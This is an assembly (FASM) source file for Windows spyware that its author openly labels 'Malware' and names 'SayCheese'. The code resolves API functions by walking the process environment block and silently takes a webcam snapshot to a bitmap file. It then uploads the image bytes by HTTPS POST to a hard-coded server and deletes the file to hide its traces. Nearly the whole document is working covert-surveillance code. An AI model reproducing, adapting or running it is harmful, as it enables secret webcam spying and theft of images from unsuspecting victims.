; MIT License
;
; Copyright (c) 2021 4B4DB4B3
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;  ___             ___ _
; / __| __ _ _  _ / __| |_  ___ ___ ___ ___
; \__ \/ _` | || | (__| ' \/ -_) -_|_-</ -_)
; |___/\__,_|\_, |\___|_||_\___\___/__/\___|
;            |__/                           4B4DB4B3
;                                                Malware
;                                                      18.05.21


format PE GUI 4.0
entry start

MAX_SIZE = 2024

section '.rdata' data readable
        luser    db 'user32.dll', 0
        lavicap  db 'avicap32.dll', 0
        lwininet db 'wininet.dll', 0

        sleep    db 'Sleep', 0
        createF  db 'CreateFileA', 0
        readF    db 'ReadFile', 0
        delfile  db 'DeleteFileA', 0

        inetOpen db 'InternetOpenA', 0
        inetCon  db 'InternetConnectA', 0
        httpOpen db 'HttpOpenRequestA', 0
        httpSend db 'HttpSendRequestA', 0
        intClose db 'InternetCloseHandle', 0
        inetOpt  db 'InternetSetOptionA', 0

        closeh   db 'CloseHandle', 0
        loadLib  db 'LoadLibraryA', 0
        sendMes  db 'SendMessageA', 0
        capCap   db 'capCreateCaptureWindowA', 0
        exitProc db 'ExitProcess', 0

        capWin   db '4B4DB4B3', 0

        server   db 'google.com', 0
        accType  db 'application/octet-stream;charset=utf-8', 0
        verb     db 'POST', 0

        _filename  db 'C:\\Users\\cheese.bmp', 0

section '.data' data readable writeable
        user32  dd   ?
        avicap  dd   ?
        wininet dd   ?

        hOpen   dd ?
        hCon    dd ?
        hReq    dd ?

        CloseHandle            dd ?
        DeleteFile             dd ?
        InternetOpen           dd ?
        InternetConnect        dd ?
        HttpOpenRequest        dd ?
        HttpSendRequest        dd ?
        InternetCloseHandle    dd ?
        InternetSetOption      dd ?

        capCreateCaptureWindow dd ?
        SendMessage dd ?

        Sleep          dd ?
        CreateFile     dd ?
        ReadFile       dd ?
        LoadLibrary    dd ?
        GetProcAddress dd ?
        ExitProcess    dd ?

        text            rb MAX_SIZE
        bytesReaded     dd ?

        hFile           dd ?

        hWebcam         dd ?

section '.code' code readable executable
        start:
                mov edi, [fs:0x030]
                mov edi, [edi + 0x00c]
                mov edi, [edi + 0x014]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x10]

                mov edx, [edi + 0x3c]
                add edx, edi
                mov edx, [edx + 0x78]
                add edx, edi
                mov esi, [edx + 0x20]
                add esi, edi
                xor ecx, ecx

        searchProcAddr:
                inc ecx
                lodsd
                add eax, edi
                cmp dword[eax], 'GetP'
                jnz searchProcAddr
                cmp dword[eax + 0x4], 'rocA'
                jnz searchProcAddr
                cmp dword[eax + 0x8], 'ddre'
                jnz searchProcAddr


                mov esi, [edx + 0x24]
                add esi, edi
                mov cx, [esi + ecx * 2]
                dec ecx
                mov esi, [edx + 0x1c]
                add esi, edi
                mov edx, [esi + ecx * 4]
                add edx, edi
                mov [GetProcAddress], edx

                push loadLib
                push edi
                call [GetProcAddress]
                mov [LoadLibrary], eax

                push sleep
                push edi
                call [GetProcAddress]
                mov [Sleep], eax

                push readF
                push edi
                call [GetProcAddress]
                mov [ReadFile], eax

                push createF
                push edi
                call [GetProcAddress]
                mov [CreateFile], eax

                push closeh
                push edi
                call [GetProcAddress]
                mov [CloseHandle], eax

                push delfile
                push edi
                call [GetProcAddress]
                mov [DeleteFile], eax

                push exitProc
                push edi
                call [GetProcAddress]
                mov [ExitProcess], eax

                push luser
                call [LoadLibrary]
                mov [user32], eax

                push sendMes
                push [user32]
                call [GetProcAddress]
                mov [SendMessage], eax


                push lavicap
                call [LoadLibrary]
                mov [avicap], eax

                push capCap
                push [avicap]
                call [GetProcAddress]

                mov [capCreateCaptureWindow], eax

                push 0
                push 0
                push 500
                push 500
                push 10
                push 10
                push 0
                push capWin
                call [capCreateCaptureWindow]
                mov [hWebcam], eax

                push 0
                push 0
                push 0x0400 + 10
                push [hWebcam]
                call [SendMessage]

                push 0
                push 0
                push 0x400 + 53
                push [hWebcam]
                call [SendMessage]

                push _filename
                push 0
                push 0x400 + 25
                push [hWebcam]
                call [SendMessage]

                push 0
                push 0
                push 0x400 + 11
                push [hWebcam]
                call [SendMessage]

                push 2000
                call [Sleep]

                push [hWebcam]
                call [CloseHandle]

                push 0
                push 0
                push 3
                push 0
                push 0x00000001
                push 0x80000000
                push _filename
                call [CreateFile]
                mov [hFile], eax
                test eax, eax
                jz exit

                push 0
                push bytesReaded
                push 1024
                push text
                push [hFile]
                call [ReadFile]
                cmp eax, 1
                jne exit


                push lwininet
                call [LoadLibrary]
                mov [wininet], eax

                push inetOpen
                push [wininet]
                call [GetProcAddress]
                mov [InternetOpen], eax

                push inetCon
                push [wininet]
                call [GetProcAddress]
                mov [InternetConnect], eax

                push httpOpen
                push [wininet]
                call [GetProcAddress]
                mov [HttpOpenRequest], eax

                push httpSend
                push [wininet]
                call [GetProcAddress]
                mov [HttpSendRequest], eax

                push intClose
                push [wininet]
                call [GetProcAddress]
                mov [InternetCloseHandle], eax

                push inetOpt
                push [wininet]
                call [GetProcAddress]
                mov [InternetSetOption], eax

                push 0
                push 0
                push 42
                push 0
                call [InternetSetOption]

                push 0
                push 0
                push 0
                push 0
                push capWin
                call [InternetOpen]
                mov [hOpen], eax

                push 0
                push 0
                push 3
                push 0
                push 0
                push 443
                push server
                push [hOpen]
                call [InternetConnect]
                mov [hCon], eax

                push 0
                push 0x00800000 or 0x80000000
                push accType
                push 0
                push 0
                push 0
                push verb
                push [hCon]
                call [HttpOpenRequest]
                mov [hReq], eax


                push MAX_SIZE
                push text
                push 0
                push 0
                push [hReq]
                call [HttpSendRequest]

        exit:
                push [hOpen]
                call [InternetCloseHandle]

                push [hCon]
                call [InternetCloseHandle]

                push [hReq]
                call [InternetCloseHandle]

                push [hFile]
                call [CloseHandle]

                push _filename
                call [DeleteFile]
                push 0
                call [ExitProcess]
                ret
